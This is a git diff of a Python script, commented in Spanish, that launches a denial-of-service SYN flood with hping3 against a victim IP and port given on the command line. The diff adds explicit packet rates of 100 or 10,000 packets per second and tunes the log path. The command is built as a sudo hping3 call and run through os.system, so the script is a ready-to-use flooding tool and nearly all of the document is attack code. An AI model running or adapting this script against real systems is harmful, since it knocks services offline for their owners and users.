@@ -23,7 +23,7 @@ import subprocess
 
 LOGFILENAME = 'DoS_attack.log'
 LOGLEVEL = logging.DEBUG
-LOGDIR = '.'
+LOGDIR = './'
 
 ##########################################
 
@@ -44,6 +44,12 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     
+    if args.attackSpeed == 'fast':
+        speed = ' -i u10000'    # Ataque fast a velocidad de 1 paquete/0.01s --> 100 paquetes/s
+    else:
+        speed = ' -i u100'      # Ataque faster a velocidad de 1 paquete/0.0001s --> 10000 paquetes/s
+
+
 
     log.info ('Iniciando DoS Attack contra ' + args.ipVictim[0] + ' a las: ' + time.strftime('%X %d/%m/%y'))
     
@@ -59,7 +65,7 @@ if __name__ == '__main__':
     
     command = ('sudo hping3 -w 64 -S -d 120' +  
                 ' -p ' + str(args.destPort) + 
-                ' --' + args.attackSpeed + 
+                speed + 
                 ' ' + args.ipVictim[0])
     log.info ('Ejecutando comando: ' + command)
     os.system(command)
